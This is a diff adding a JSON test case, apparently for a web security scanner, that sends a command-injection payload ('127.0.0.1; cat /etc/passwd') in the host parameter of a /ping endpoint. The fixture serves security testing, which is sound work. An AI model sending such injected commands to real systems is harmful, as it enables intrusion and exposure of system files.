@@ -1,0 +1,12 @@
+{
+    "name": "Command Injection via Query Param",
+    "description": "Inject OS command using semicolon separator",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cat /etc/passwd"
+    }
+  }
